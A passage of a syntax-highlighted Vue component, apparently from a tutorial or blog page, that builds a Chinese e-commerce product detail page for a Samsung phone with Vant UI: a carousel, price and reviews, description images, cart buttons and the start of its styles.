class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"prodetail"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"商品详情页"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">autoplay</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">3000</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">change</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onChange</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">image</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">images</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">image</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #D4D4D4"> #</span><span style="color: #9CDCFE">indicator</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"custom-indicator"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">current</span><span style="color: #D4D4D4"> + </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> }} / {{ </span><span style="color: #9CDCFE">images</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 商品说明 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"title"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"price"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"now"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥0.01</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"oldprice"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥6699.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sellcount"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">已售1001件</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"msg text-ellipsis-2"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        三星手机 SAMSUNG Galaxy S23 8GB+256GB 超视觉夜拍系统 超清夜景 悠雾紫</span></span><span class="line"><span style="color: #D4D4D4">        5G手机 游戏拍照旗舰机s23</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"service"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left-words"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"passed"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">七天无理由退货</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"passed"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">48小时发货</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right-icon"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"arrow"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 商品评价 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment-title"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">商品评价 (5条)</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">查看更多 </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"arrow"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment-item"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">3</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"top"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"http://cba.itlike.com/public/uploads/10001/20230321/a0db9adb2e666a65bc8dd133fbed7834.png"</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">            /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"name"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">神雕大侠</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-rate</span></span><span class="line"><span style="color: #D4D4D4">              :</span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">16</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">              :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#ffd21e"</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">void-icon</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"star"</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">void-color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#eee"</span></span><span class="line"><span style="color: #D4D4D4">            /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"content"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">质量很不错 挺喜欢的</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"time"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">2023-03-21 15:01:35</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 商品描述 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"desc"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"https://uimgproxy.suning.cn/uimg1/sop/commodity/kHgx21fZMWwqirkMhawkAw.jpg"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"https://uimgproxy.suning.cn/uimg1/sop/commodity/0rRMmncfF0kGjuK5cvLolg.jpg"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"https://uimgproxy.suning.cn/uimg1/sop/commodity/2P04A4Jn0HKxbKYSHc17kw.jpg"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"https://uimgproxy.suning.cn/uimg1/sop/commodity/MT4k-mPd0veQXWPPO5yTIw.jpg"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 底部 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"footer"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"icon-home"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"wap-home-o"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">首页</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"icon-cart"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"shopping-cart-o"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">购物车</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"btn-add"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">加入购物车</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"btn-buy"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">立刻购买</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"ProDetail"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">images:</span><span style="color: #D4D4D4"> [</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"https://img01.yzcdn.cn/vant/apple-1.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"https://img01.yzcdn.cn/vant/apple-2.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      ],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">current:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">onChange</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">current</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.prodetail</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-icon-arrow-left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.custom-indicator</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">absolute</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: 